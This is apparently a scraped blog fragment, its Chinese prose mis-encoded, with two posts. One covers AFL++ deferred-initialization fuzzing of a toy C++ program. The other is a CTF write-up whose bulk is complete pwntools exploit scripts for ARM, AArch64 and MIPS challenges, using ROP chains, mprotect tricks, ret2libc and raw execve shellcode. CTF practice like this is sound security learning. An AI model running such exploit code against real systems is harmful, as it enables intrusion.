&lt;p&gt;Ê≠§Ê¨°ÁªÉ‰π†ÁÜüÊÇâAFL++ÁöÑ‰∏Ä‰∏™ÁâπÊÄßÔºå&lt;code&gt;delayed initialization&lt;/code&gt;&lt;br&gt;
Ëß¶Âèë&lt;code&gt;abort()&lt;/code&gt;ÁöÑÂáΩÊï∞Â≠òÂú®‰∫é&lt;code&gt;specs.cpp&lt;/code&gt;‰∏≠ÔºåÂæàÂÆπÊòìËß¶Âèë&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;
void Specs::choose_color() {
    std::string color;
    std::cout &amp;lt;&amp;lt; &amp;quot;enter desired aircraft color: &amp;quot;;
    std::cin &amp;gt;&amp;gt; color;
    if (isNumber(color))
        abort();
}

void Specs::min_alt() {
    // bool too_low = true;
    std::cout &amp;lt;&amp;lt; &amp;quot;enter aircraft minimum altitude: &amp;quot;;
    std::cin &amp;gt;&amp;gt; alt;
    // do {
        // too_low = false;
    if(alt &amp;lt; 0) {
        std::cout &amp;lt;&amp;lt; &amp;quot;too low. crashing!&amp;quot; &amp;lt;&amp;lt; std::endl;
        abort();
    }
    else if (alt &amp;gt; 500) {
        std::cout &amp;lt;&amp;lt; &amp;quot;too high. lowering to 500&amp;quot;;
        alt = 500;
        // too_low = true;
    }
    // } while(too_low);
}

void Specs::min_airspeed() {
    bool out_of_bounds = true;
    std::cout &amp;lt;&amp;lt; &amp;quot;enter aircraft minimum airspeed: &amp;quot;;
    std::cin &amp;gt;&amp;gt; speed;
    do {
        out_of_bounds = false;
        if(speed &amp;lt; 0)
            abort();
        if(speed &amp;lt; 100) {
            std::cout &amp;lt;&amp;lt; &amp;quot;too low. please re-enter: &amp;quot;;
            std::cin &amp;gt;&amp;gt; speed;
            out_of_bounds = true;
        } else if (speed &amp;gt; 200) {
            std::cout &amp;lt;&amp;lt; &amp;quot;too high. please re-enter: &amp;quot;;
            std::cin &amp;gt;&amp;gt; speed;
            out_of_bounds = true;
        }
    } while(out_of_bounds);
}

void Specs::fuel_cap() {
    bool too_high = true;
    std::cout &amp;lt;&amp;lt; &amp;quot;enter fuel capacity: &amp;quot;;
    std::cin &amp;gt;&amp;gt; fuel;
    do {
        too_high = false;
        if(fuel &amp;lt; 0)
            abort();
        if (fuel &amp;gt; 100) {
            std::cout &amp;lt;&amp;lt; &amp;quot;too high. please re-enter: &amp;quot;;
            std::cin &amp;gt;&amp;gt; fuel;
            too_high = true;
        }
    } while(too_high);
}

}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂÆòÊñπÊñáÊ°£ : &lt;a href=&#34;https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.persistent_mode.md&#34;&gt;https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.persistent_mode.md&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ÂÆòÊñπÊñáÊ°£‰∏≠ÊèèËø∞ÁöÑafl++Âè™ÊâßË°å‰∏ÄÊ¨°Á®ãÂ∫èÔºåÂπ∂Âú®&lt;code&gt;main()&lt;/code&gt;‰πãÂâçÂÅúÊ≠¢ÔºåÁÑ∂ÂêéÂÖãÈöÜËøô‰∏™‰∏ªËøõÁ®ã‰ºòÂåñÊÄßËÉΩÔºåÂ¶ÇÊ∂àÈô§‰∏Ä‰∫õÊó∂Èó¥ÊàêÊú¨ÔºåÊØîÂ¶ÇÁ®ãÂ∫èÁöÑÈìæÊé•Á≠âÔºå‰ΩÜÂú®‰∏Ä‰∫õÊÉÖÂÜµ‰∏ãÂèØËÉΩÂπ∂‰∏çÊÄªÊòØÊúâÊïàÔºåÂ¶ÇÂä†ËΩΩ‰∏Ä‰∫õËæÉÂ§ßÁöÑÈÖçÁΩÆÊñá‰ª∂&lt;br&gt;
ÊñáÊ°£‰∏≠Êúâ‰∏™ËØçÂè´&lt;code&gt;Deferred initialization &lt;/code&gt;,ÁøªËØëËøáÊù•ÂèØ‰ª•Âè´‰Ωú&lt;code&gt;Âª∂ËøüÂàùÂßãÂåñ&lt;/code&gt;,ÊåáÂú®&lt;code&gt;main()&lt;/code&gt;ÂáΩÊï∞‰∏≠ÁöÑÊüê‰∏™‰ΩçÁΩÆÂºÄÂßãÂÖãÈöÜÔºåÂú®‰∏Ä‰∫õÊÉÖÂÜµ‰∏ãÂèØ‰ª•ÊúâÊïàÊèêÈ´òÊïàÁéáÔºåÂè™ÈúÄË¶Å‰ΩøÁî®Â¶Ç‰∏ãÂëΩ‰ª§:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#ifdef __AFL_HAVE_MANUAL_CONTROL
__AFL_INIT();
#endif
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;‰ª•‰∏äÂëΩ‰ª§Ê∑ªÂä†Âú®&lt;code&gt;main()&lt;/code&gt;‰∏≠ÂàùÂßãÂåñ&lt;code&gt;spec&lt;/code&gt;ÂêéÔºåÊØîÂ¶Ç&lt;code&gt;specs-slice.cpp&lt;/code&gt;‰∏≠Ôºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;/*
 *
 *
 * This file isolates the Specs class and tests out the 
 * choose_color function specifically.
 * 
 * 
 * 
 */

#include &amp;quot;specs.h&amp;quot;

int main(int argc, char** argv) {
    // In order to call any functions in the Specs class, a Specs
    // object is necessary. This is using one of the constructors
    // found in the Specs class.
    Specs spec(505, 110, 50);
    // By looking at all the code in our project, this is all the 
    // necessary setup required. Most projects will have much more
    // that is needed to be done in order to properly setup objects.

    // This section should be in your code that you write after all the 
    // necessary setup is done. It allows AFL++ to start from here in 
    // your main() to save time and just throw new input at the target.
    #ifdef __AFL_HAVE_MANUAL_CONTROL
        __AFL_INIT();
    #endif

    spec.choose_color();
    //spec.min_alt();

    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;‰ª•‰∏äËØ¥ÊòéÁªìÊùüÂêéËøõË°åfuzz&lt;/p&gt;
&lt;p&gt;ËÆæÁΩÆ&lt;code&gt;env&lt;/code&gt;ÁéØÂ¢ÉÂèòÈáèÂêémake:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;  export CC=afl-clang-fast
  export CXX=afl-clang-fast++
  make
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂΩìÂâçÁõÆÂΩï‰∏ãÂàõÂª∫&lt;code&gt;ipt,opt&lt;/code&gt;Êñá‰ª∂Â§πÔºåÂú®&lt;code&gt;ipt/&lt;/code&gt;‰∏ãÁîüÊàêÈöèÊú∫ÁßçÂ≠ê&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;dd if=/dev/urandom of=1.in bs=64 count=10
dd if=/dev/urandom of=2.in bs=64 count=10
dd if=/dev/urandom of=3.in bs=64 count=10
dd if=/dev/urandom of=4.in bs=64 count=10
dd if=/dev/urandom of=5.in bs=64 count=10
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;‰πãÂêéÁöÑfuzzÈÉΩËÉΩË∑ëÂá∫ÂØπÂ∫îcrash&lt;br&gt;
ÂàÜÂà´ÊµãËØï‰∫ÜÈªòËÆ§ÂàùÂßãÂåñÂíåÂª∂ËøüÂàùÂßãÂåñÁöÑÈÄüÂ∫¶Ôºö&lt;br&gt;
Âª∂ËøüÔºö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1695977127711.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÈªòËÆ§Ôºö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1695977134607.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ËøòÊòØÂèØ‰ª•ÂèëÁé∞ËæÉÊòéÊòæÁöÑÈÄüÂ∫¶Â∑ÆÂºÇ&lt;/p&gt;
">Fuzzing Module</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/VLuqmf0iP/"" data-c="
          &lt;h3 id=&#34;ÂâçË®Ä&#34;&gt;ÂâçË®ÄÔºö&lt;/h3&gt;
&lt;p&gt;ËÆ∞ÂΩï‰∏Ä‰∏ãÊúÄËøëÂÅöÁöÑÂá†ÈÅìÂºÇÊûÑÂÖ•Èó®È¢ò&lt;/p&gt;
&lt;h3 id=&#34;jarvisoj_typo&#34;&gt;jarvisoj_typoÔºö&lt;/h3&gt;
&lt;p&gt;32‰ΩçarmÔºåÈùôÊÄÅÈìæÊé•ÔºåÊú¨Âú∞ÊµãÂá∫ÂÅèÁßªÂêéropÂç≥ÂèØ&lt;br&gt;
Ê≥®ÊÑèÁöÑÊòØÂõ†‰∏∫ÂéªÊéâ‰∫ÜÁ¨¶Âè∑Ë°®ÊâÄ‰ª•&lt;code&gt;system&lt;/code&gt;ÂáΩÊï∞ÂèØËÉΩÈúÄË¶ÅÊâæ‰∏Ä‰ºöÂÑøÔºåÂèØ‰ª•‰ΩøÁî®xrefÊâæ&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
remote_addr = [&amp;quot;node4.buuoj.cn&amp;quot;,27348]
#libc = ELF(&#39;&#39;)
#elf = ELF(&#39;&#39;)
if len(sys.argv) == 1:
    # context.log_level=&amp;quot;debug&amp;quot; 
    #io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;/usr/aarch64-linux-gnu/&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./stack&amp;quot;]) 
    # io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./stack&amp;quot;]) 
    io = process([&amp;quot;qemu-arm-static&amp;quot;, &amp;quot;-g&amp;quot;, &amp;quot;1234&amp;quot;, &amp;quot;./typo&amp;quot;]) 
    # io = process(&amp;quot;&amp;quot;)
    context(arch=&#39;arm&#39;, os=&#39;linux&#39;,bits=&#39;32&#39;)
    # context.terminal[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        io = remote(remote_addr[0],remote_addr[1])
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        #context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)

str_sh=0x6c384
sys_addr=0x110b4


payload=cyclic(0x200)
io.sendafter(b&amp;quot;t\n&amp;quot;,b&amp;quot;\n&amp;quot;)
# io.send(payload)

#offset 112 
#0x00020904: pop {r0, r4, pc}; 


payload=cyclic(112)+p32(0x20904)+p32(str_sh)*2+p32(sys_addr)
io.sendafter(b&amp;quot;\n&amp;quot;,payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;shanghai2018_babyarm&#34;&gt;shanghai2018_babyarmÔºö&lt;/h3&gt;
&lt;p&gt;aarch64Âä®ÊÄÅÈìæÊé•ÔºåÂºÄÂêØnxÔºåÂ≠òÂú®mprotectÂáΩÊï∞ÂèØ‰ª•ÂºÄrwxÊÆµÂÜôshellcode&lt;br&gt;
Ê≥®ÊÑè‰∏Ä‰∏ãËÄÅÁîüÂ∏∏Ë∞àÁöÑÂ∏ÉÊ†àÈóÆÈ¢ò&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
remote_addr = [&amp;quot;node4.buuoj.cn&amp;quot;,25721]
#libc = ELF(&#39;&#39;)
elf = ELF(&#39;./pwn&#39;)
if len(sys.argv) == 1:
    # context.log_level=&amp;quot;debug&amp;quot; 
    #io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;/usr/aarch64-linux-gnu/&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./stack&amp;quot;]) 
    # io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./stack&amp;quot;]) 
    io = process([&amp;quot;qemu-aarch64-static&amp;quot;, &amp;quot;-g&amp;quot;, &amp;quot;1234&amp;quot;, &amp;quot;./pwn&amp;quot;]) 
    # io = process(&amp;quot;&amp;quot;)
    context(arch=&#39;aarch64&#39;, os=&#39;linux&#39;)
    # context.terminal[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        io = remote(remote_addr[0],remote_addr[1])
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        context(arch=&#39;aarch64&#39;, os=&#39;linux&#39;)
        #context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)

csu_2=0x4008CC
# LDP             X19, X20, [SP,#var_s10]
# LDP             X21, X22, [SP,#var_s20]
# LDP             X23, X24, [SP,#var_s30]
# LDP             X29, X30, [SP+var_s0],#0x40
# RET

#RET Ë∑≥ËΩ¨ÁöÑÊòØX30‰øùÂ≠òÁöÑÂú∞ÂùÄÔºåX30Â≠òÊîæËøîÂõûÂú∞ÂùÄ

csu_1=0x4008ac
# LDR             X3, [X21,X19,LSL#3]  Ê≠§Â§ÑÊéßÂà∂X19ÂÄº‰∏∫0Âç≥ÂèØÂ∞ÜX21ÂÄºËµãÂÄºÁªôX3
# MOV             X2, X22
# MOV             X1, X23
# MOV             W0, W24
# ADD             X19, X19, #1
# BLR             X3
# CMP             X19, X20
# B.NE            loc_4008AC



mprotect=elf.plt[b&amp;quot;mprotect&amp;quot;]
# STP             X29, X30, [SP,#-0x10+var_s0]!
# MOV             X29, SP
# MOV             W2, #0                  ; prot
# MOV             X1, #0x1000             ; len
# MOV             X0, #off_411000         ; addr
# BL              .mprotect
# NOP
# LDP             X29, X30, [SP+var_s0],#0x10
# RET


tar_addr=0x411068

io.sendafter(b&amp;quot;Name:&amp;quot;,p64(mprotect)+asm(shellcraft.sh()))
# payload=cyclic(0x48)+asm(shellcraft.sh())

payload=cyclic(0x48)+p64(csu_2)
payload+=p64(0)+p64(csu_1) # X19-&amp;gt;0 X30-&amp;gt;csu_1
payload+=p64(0)+p64(1) # X19-&amp;gt;0 X20-&amp;gt;1
payload+=p64(tar_addr)+p64(7)+p64(0x1000)+p64(tar_addr+8) # X3-&amp;gt;X21-&amp;gt;tar_addr X2-&amp;gt;X22-&amp;gt;7 X1-&amp;gt;X23-&amp;gt;0x1000 W0-&amp;gt;W24(X24)-&amp;gt;tar_addr+0x8

payload+=p64(0)+p64(tar_addr+0x8) # mprotect X29-&amp;gt;0 X30-&amp;gt;tar_addr+0x8

io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;axb_2019_mips&#34;&gt;axb_2019_mips:&lt;/h3&gt;
&lt;p&gt;mipsÊòØÂÖ≥Èó≠‰∫ÜnxÁöÑÔºåÂèØ‰ª•ÊûÑÈÄ†readÂ∞ÜshellcodeËØªÂÖ•bssÊÆµÁÑ∂ÂêéË∑≥ËΩ¨Âà∞bssÊÆµÊâßË°å&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
remote_addr = [&amp;quot;node4.buuoj.cn&amp;quot;,27635]
#libc = ELF(&#39;&#39;)
#elf = ELF(&#39;&#39;)
if len(sys.argv) == 1:
    # context.log_level=&amp;quot;debug&amp;quot; 
    #io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;/usr/aarch64-linux-gnu/&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./stack&amp;quot;]) 
    # io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./stack&amp;quot;]) 
    io = process([&amp;quot;qemu-mipsel-static&amp;quot;, &amp;quot;-g&amp;quot;, &amp;quot;1234&amp;quot;,&amp;quot;-L&amp;quot;,&amp;quot;.&amp;quot;,&amp;quot;./pwn2&amp;quot;]) 
    # io = process(&amp;quot;&amp;quot;)
    context(arch=&#39;mips&#39;,endian=&#39;little&#39;, os=&#39;linux&#39;,bits=&#39;32&#39;)
    # context.terminal[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        context(arch=&#39;mips&#39;,endian=&#39;little&#39;, os=&#39;linux&#39;,bits=&#39;32&#39;)
        io = remote(remote_addr[0],remote_addr[1])
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        #context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)

shellcode=asm(shellcraft.sh())
bss_addr=0x410c00
read_text=0x4007e0

io.sendafter(b&amp;quot;name: \n&amp;quot;,b&amp;quot;aaa&amp;quot;)

# payload=cyclic(0x200)
#offset 36

# # NOP sled (XOR $t0, $t0, $t0; as NOP is only null bytes)
# for i in range(29):
#     payload += b&amp;quot;\x26\x40\x08\x01&amp;quot;

payload=cyclic(0x20)+p32(bss_addr)+p32(read_text)
io.sendafter(b&amp;quot;aaa&amp;quot;,payload)

sleep(1)

payload=cyclic(0x24)+p32(bss_addr+0x40)+b&amp;quot;\x26\x40\x08\x01&amp;quot;*20+shellcode
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ycb_2020_mipspwn&#34;&gt;ycb_2020_mipspwn:&lt;/h3&gt;
&lt;p&gt;mipselÔºåÊâìÊ≥ïÂêå‰∏äÔºåÂêëbssÊÆµÂÜôÂÖ•shellcodeË∑≥ËΩ¨ÊâßË°å&lt;br&gt;
Ê≠§È¢òÈúÄË¶ÅÈôêÂà∂‰∏Ä‰∏ãshellcodeÈïøÂ∫¶Ôºå‰ΩøÁî®shellcraftÁîüÊàêÁöÑËøáÈïø‰∫Ü&lt;br&gt;
ÂèØ‰ª•‰∏äexdbÊâæ:&lt;a href=&#34;https://www.exploit-db.com/shellcodes/13300&#34;&gt;https://www.exploit-db.com/shellcodes/13300&lt;/a&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
remote_addr = [&amp;quot;node4.buuoj.cn&amp;quot;,26964]
#libc = ELF(&#39;&#39;)
#elf = ELF(&#39;&#39;)
if len(sys.argv) == 1:
    # context.log_level=&amp;quot;debug&amp;quot; 
    #io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;/usr/aarch64-linux-gnu/&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./stack&amp;quot;]) 
    # io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./stack&amp;quot;]) 
    # io = process([&amp;quot;qemu-mipsel-static&amp;quot;, &amp;quot;-g&amp;quot;, &amp;quot;1234&amp;quot;,&amp;quot;-L&amp;quot;,&amp;quot;.&amp;quot;,&amp;quot;./pwn2&amp;quot;]) 
    io = process([&amp;quot;qemu-mipsel-static&amp;quot;, &amp;quot;-g&amp;quot;, &amp;quot;1234&amp;quot;,&amp;quot;./pwn2&amp;quot;]) 
    # io = process(&amp;quot;&amp;quot;)
    context(log_level=&#39;debug&#39;,arch=&#39;mips&#39;,endian=&#39;little&#39;, os=&#39;linux&#39;,bits=&#39;32&#39;)
    # context.terminal[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        context(arch=&#39;mips&#39;,endian=&#39;little&#39;, os=&#39;linux&#39;,bits=&#39;32&#39;)
        io = remote(remote_addr[0],remote_addr[1])
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        #context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)
        
        
bss_addr=0x411700
read_text=0x400f50


io.sendafter(b&amp;quot;here:\n&amp;quot;,b&amp;quot;aaa&amp;quot;)
io.recv()
io.sendline(b&amp;quot;7&amp;quot;)

#payload=cyclic(0x200)
#offset 60

payload=cyclic(56)+p32(bss_addr)+p32(read_text)
io.sendafter(b&amp;quot;feeling:\n&amp;quot;,payload)

shellcode=b&amp;quot;\xff\xff\x10\x04\xab\x0f\x02\x24&amp;quot;
shellcode+=b&amp;quot;\x55\xf0\x46\x20\x66\x06\xff\x23&amp;quot;
shellcode+=b&amp;quot;\xc2\xf9\xec\x23\x66\x06\xbd\x23&amp;quot;
shellcode+=b&amp;quot;\x9a\xf9\xac\xaf\x9e\xf9\xa6\xaf&amp;quot;
shellcode+=b&amp;quot;\x9a\xf9\xbd\x23\x21\x20\x80\x01&amp;quot;
shellcode+=b&amp;quot;\x21\x28\xa0\x03\xcc\xcd\x44\x03&amp;quot;
shellcode+=b&amp;quot;/bin/sh&amp;quot;

payload=b&amp;quot;a&amp;quot;*60+p32(bss_addr+88)+shellcode

io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;hkcert2023_rop&#34;&gt;hkcert2023_rop:&lt;/h3&gt;
&lt;p&gt;mipsÔºåÊûÑÈÄ†getsÂæÄÂèØÂÜôÊÆµ‰∏äÂÜôshellcodeÔºåÂÜçÊâægadgetË∑≥ËøáÂéªÔºåÊúÄÂêéÊ∫¢Âá∫Ë∑≥ËΩ¨&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
remote_addr = [&amp;quot;chal.hkcert23.pwnable.hk&amp;quot;,28151]
#libc = ELF(&#39;&#39;)
#elf = ELF(&#39;&#39;)
if len(sys.argv) == 1:
    context.log_level=&amp;quot;debug&amp;quot; 
    p = process([&amp;quot;qemu-mips-static&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./rop&amp;quot;]) 
    elf=ELF(&amp;quot;./rop&amp;quot;)
    # p = process([&amp;quot;qemu-mips-static&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./rop&amp;quot;]) 
    # p = process(&amp;quot;./rop&amp;quot;)
    context(arch=&#39;mips&#39;,endian=&#39;big&#39;,bits=&#39;32&#39;,os=&#39;linux&#39;)
    context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        context(arch=&#39;mips&#39;,endian=&#39;big&#39;,bits=&#39;32&#39;,os=&#39;linux&#39;)
        p = remote(remote_addr[0],remote_addr[1])
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        #context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)

# gdb.attach(p)
# pause()
nop=b&amp;quot;\x01\x08\x40\x26&amp;quot;
shellcode = asm(&#39;&#39;&#39;
  lui $t7, 0x2f2f
  ori $t7, $t7,0x6269
  lui $t6, 0x6e2f
  ori $t6, $t6, 0x7368
  sw $t7, -12($sp)
  sw $t6, -8($sp)
  sw $zero, -4($sp)
  addiu $a0, $sp, -12
  slti $a1, $zero, -1
  slti $a2, $zero, -1
  li $v0, 4011
  syscall 0x040405
&#39;&#39;&#39;)

#                   LAB_00456c34                          XREF[1]:  00456c20(j)  
#  00456c34 8f bf       lw       ra,local_4(sp)
#          00 5c
#  00456c38 8f a2       lw       v0,local_3c(sp)
#          00 24
#  00456c3c 8f b3       lw       s3,local_8(sp)
#          00 58
#  00456c40 8f b2       lw       s2,local_c(sp)
#          00 54
#  00456c44 8f b1       lw       s1,local_10(sp)
#          00 50
#  00456c48 8f b0       lw       s0,local_14(sp)
#          00 4c
#  00456c4c 03 e0       jr       ra
#          00 08



gets_text=0x400820


payload=flat(
    {
        0x24:p32(0x49cc20),
        0x4c:p32(0),
        0x5c:p32(gets_text),
    }
)


p.sendlineafter(b&amp;quot;input : \n&amp;quot;,b&amp;quot;a&amp;quot;*72+p32(0x49cc20)+p32(0x456c34)+payload)

p.sendline(shellcode+cyclic(0x64-len(shellcode))+p32(0x49cc20))


p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;mtctf-2022aarch64_ret2libc&#34;&gt;[MTCTF 2022]aarch64_ret2libc:&lt;/h3&gt;
&lt;p&gt;aarch64ÔºåÊ≥ÑÈú≤ÁöÑlibcÊúâ&lt;code&gt;\x00&lt;/code&gt;Êà™Êñ≠ÔºåÂπ≥Âè∞‰∏äÈúÄË¶ÅÁàÜÁ†¥Âú∞ÂùÄ&lt;br&gt;
Êâæ&lt;code&gt;ldr&lt;/code&gt;Âíå&lt;code&gt;ldp&lt;/code&gt;Êåá‰ª§ÁöÑgadgetÔºåÊéßÂà∂ÁöÑ&lt;code&gt;x0&lt;/code&gt;‰∏∫&lt;code&gt;/bin/sh&lt;/code&gt;Âú∞ÂùÄÔºå&lt;code&gt;x30&lt;/code&gt;‰∏∫retÂú∞ÂùÄ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import sys
remote_addr = [&amp;quot;node4.anna.nssctf.cn&amp;quot;,28926]
#libc = ELF(&#39;&#39;)
#elf = ELF(&#39;&#39;)
if len(sys.argv) == 1:
    context.log_level=&amp;quot;debug&amp;quot; 
    # io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;-g&amp;quot;,&amp;quot;1234&amp;quot;,&amp;quot;./pwn&amp;quot;]) 
    io = process([&amp;quot;qemu-aarch64&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;,&amp;quot;./pwn&amp;quot;]) 
    elf = ELF(&amp;quot;./pwn&amp;quot;)
    libc = ELF(&amp;quot;./lib/libc.so.6&amp;quot;)
    # io = process([&amp;quot;qemu-mips-static&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./pwn&amp;quot;]) 
    # io = process(&amp;quot;./pwn&amp;quot;)
    context(arch=&#39;aarch64&#39;,os=&#39;linux&#39;)
if len(sys.argv) == 2 :
    if &#39;r&#39; in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 
        elf = ELF(&amp;quot;./pwn&amp;quot;)
        libc = ELF(&amp;quot;./lib/libc.so.6&amp;quot;)
        io = remote(remote_addr[0],remote_addr[1])
    if &#39;n&#39; not in sys.argv[1]:
        context.log_level=&amp;quot;debug&amp;quot; 


def get_gift(cc):
    io.sendlineafter(b&amp;quot;&amp;gt;\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendafter(b&amp;quot;sensible&amp;gt;&amp;gt;\n&amp;quot;,cc)

def overflow(cc):
    io.sendlineafter(b&amp;quot;&amp;gt;\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,cc)

ct=0
num=[]
for i in range(0x10,0x100):
    num.append(i)
for i in range(0,0xf0):
    print(&amp;quot;ct: &amp;quot;,hex(num[i]))

while(True):
    # try:
        elf = ELF(&amp;quot;./pwn&amp;quot;)
        libc = ELF(&amp;quot;./lib/libc.so.6&amp;quot;)
        io = remote(remote_addr[0],remote_addr[1])
        # io = process([&amp;quot;qemu-mips-static&amp;quot;, &amp;quot;-L&amp;quot;, &amp;quot;.&amp;quot;, &amp;quot;./pwn&amp;quot;]) 
        # io = process(&amp;quot;./pwn&amp;quot;)
        context(arch=&#39;aarch64&#39;,os=&#39;linux&#39;)
        puts_got=elf.got[b&amp;quot;puts&amp;quot;]

        get_gift(p64(puts_got))

        leak_addr=u64(io.recv(3).ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
        print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

        base_addr=0x4000000000
        # base_addr = base_addr * num[ct]
        print(&amp;quot;base_addr: &amp;quot;,hex(base_addr))
        ct = ct+1
        # base_addr=0x0

        sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]+base_addr
        str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))+base_addr

        print(&amp;quot;sys_addr: &amp;quot;,hex(sys_addr))
        print(&amp;quot;str_sh: &amp;quot;,hex(str_sh))

        gadget=leak_addr+0xb6518+base_addr
        # 0x00000000000b6518: ldr x0, [sp, #0x70]; ldp x29, x30, [sp], #0x1a0; ret;
        # payload=cyclic(0x100)
        print(&amp;quot;offset: &amp;quot;,hex(cyclic_find(0x6261616a))) #0x88

        payload=cyclic(0x88)+p64(gadget)

        fake_stack=cyclic(0x10)+p64(sys_addr)*2
        fake_stack=fake_stack.ljust(0x80,b&amp;quot;a&amp;quot;)+p64(str_sh)
        # fake_stack=fake_stack.ljust(0xc0,b&amp;quot;a&amp;quot;)+p64(0xbeefdead)+p64(sys_addr)
        overflow(payload+fake_stack)
        sleep(0.2)
        io.interactive()
    #     io.sendline(b&amp;quot;cat flag&amp;quot;)
    #     sleep(0.2)
    #     t=io.recv()
    #     print(t)
    #     if b&amp;quot;NSS&amp;quot; in t:
    #         break
    #     else:
    #         io.close()
    #         continue
    # except:
    #     io.close()
    #     continue
&lt;/code&gt;&lt;/pre&gt;
